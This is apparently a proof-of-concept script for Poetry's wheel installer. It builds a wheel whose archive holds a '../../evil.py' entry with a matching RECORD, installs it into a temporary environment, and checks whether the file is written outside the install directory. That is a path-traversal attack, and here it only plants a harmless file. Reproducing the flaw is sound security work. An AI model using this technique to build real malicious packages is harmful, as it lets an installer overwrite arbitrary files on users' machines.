import base64, hashlib, tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

def rec(n, d):
    h = base64.urlsafe_b64encode(hashlib.sha256(d).digest()).rstrip(b"=").decode()
    return f"{n},sha256={h},{len(d)}"

root = Path(tempfile.mkdtemp())
di = "demo-1.0.dist-info"
files = {
    "../../evil.py": b"pwned\n",
    f"{di}/METADATA": b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
    f"{di}/WHEEL": b"Wheel-Version: 1.0\nGenerator: t\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
}
whl = root / "demo-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    for n, d in files.items():
        z.writestr(n, d)
    z.writestr(f"{di}/RECORD", "\n".join([rec(n, d) for n, d in files.items()] + [f"{di}/RECORD,,"]))

class Env:
    python = Path("/usr/bin/python3")
    scheme_dict = {k: str(root / "env" / k) for k in ("purelib", "platlib", "scripts", "data", "include")}

WheelInstaller(Env()).install(whl)
print((root / "evil.py").exists(), (root / "evil.py").read_text())
